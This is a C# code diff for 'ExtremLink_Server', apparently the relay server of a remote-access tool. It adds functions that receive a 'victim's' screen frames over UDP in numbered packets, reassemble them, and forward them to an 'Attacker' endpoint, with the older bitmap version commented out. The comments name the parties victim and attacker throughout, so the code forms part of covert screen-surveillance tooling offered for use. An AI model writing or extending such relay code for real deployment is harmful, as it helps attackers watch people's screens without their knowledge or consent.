@@ -5,6 +5,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Drawing;
 using System.Drawing.Imaging;
+using OpenCvSharp;
 
 // Networking modules
 using System.Net;
@@ -145,9 +146,8 @@ namespace ExtremLink_Server.Classes
             // & - frames handling.
             while (true)
             {
-                BitmapImage tempFrame = this.GetFrame();
-                Log.LogInstance.AddMessage("A frame was received from the victim");
-                this.SendFrame(this.ConvertBitmapImageToRenderTargetBitmap(tempFrame));
+                byte[] tempFrame = this.GetFrame();
+                this.SendFrame(tempFrame);
                 Thread.Sleep(1000);
             }
         }
@@ -345,7 +345,93 @@ namespace ExtremLink_Server.Classes
 
 
         // Getting frames function:
-        public BitmapImage GetFrame()
+        public byte[] GetFrame()
+        {
+            // Input: Nothing.
+            // Output: The function gets a frame from the victim as a byte array in h265 format.
+            Dictionary<int, byte[]> receivedPackets = new Dictionary<int, byte[]>();
+            int streamId = -1;
+            int totalPackets = -1;
+
+            // Receive packets
+            while (receivedPackets.Count < totalPackets || totalPackets == -1)
+            {
+                // Buffer size for each packet
+                byte[] buffer = new byte[1412]; // 1400 + 12 bytes for metadata
+                int bytesRead = this.victim.UdpSocket.Receive(buffer);
+
+                // Extract metadata
+                int receivedStreamId = BitConverter.ToInt32(buffer, 0);
+                int receivedTotalPackets = BitConverter.ToInt32(buffer, 4);
+                int packetIndex = BitConverter.ToInt32(buffer, 8);
+
+                // Ensure packets are part of the same stream
+                if (streamId == -1) streamId = receivedStreamId;
+                if (totalPackets == -1) totalPackets = receivedTotalPackets;
+                if (streamId != receivedStreamId) continue;
+
+                // Extract segment data
+                byte[] segmentData = new byte[bytesRead - 12];
+                Array.Copy(buffer, 12, segmentData, 0, bytesRead - 12);
+
+                // Store segment if not already received
+                if (!receivedPackets.ContainsKey(packetIndex))
+                {
+                    receivedPackets[packetIndex] = segmentData;
+                }
+            }
+            using (var ms = new MemoryStream())
+            {
+                for (int i = 0; i < totalPackets; i++)
+                {
+                    if (receivedPackets.TryGetValue(i, out var segment))
+                    {
+                        ms.Write(segment, 0, segment.Length);
+                    }
+                    else
+                    {
+                        throw new Exception($"Missing packet {i}");
+                    }
+                }
+                return ms.ToArray();
+            }
+        }
+
+        // Sending frame function:
+        public void SendFrame(byte[] frame)
+        {
+            // Input: A byte array which contains the content of an h265 file.
+            // Output: The function sends the given byte array to the Attacker.
+
+            // Define packet size (MTU-safe)
+            const int packetSize = 1400; // Keeping under the MTU limit
+            int totalPackets = (int)Math.Ceiling((double)frame.Length / packetSize);
+
+            // Generate a random stream ID to identify this data stream
+            int streamId = new Random().Next(1, int.MaxValue);
+
+            // Send packets
+            for (int i = 0; i < totalPackets; i++)
+            {
+                // Calculate packet bounds
+                int offset = i * packetSize;
+                int size = Math.Min(packetSize, frame.Length - offset);
+
+                // Construct packet (12 bytes of metadata + segment data)
+                byte[] packet = new byte[size + 12];
+                BitConverter.GetBytes(streamId).CopyTo(packet, 0);         // 4 bytes: Stream ID
+                BitConverter.GetBytes(totalPackets).CopyTo(packet, 4);     // 4 bytes: Total packets
+                BitConverter.GetBytes(i).CopyTo(packet, 8);                // 4 bytes: Packet index
+                Array.Copy(frame, offset, packet, 12, size);               // Segment data
+
+                // Send packet
+                this.attacker.UdpSocket.SendTo(packet, this.attacker.ClientUdpEndPoint);
+            }
+        }
+
+
+
+        /*public BitmapImage GetFrame()
         {
             try
             {
@@ -522,7 +608,7 @@ namespace ExtremLink_Server.Classes
                 this.attacker.UdpSocket.SendTo(packet, new IPEndPoint(IPAddress.Parse(this.attacker.IpAddress), this.attacker.ATTACKER_UDP_PORT));
             }
         }
-
+        */
 
 
         // SQL database queries functions
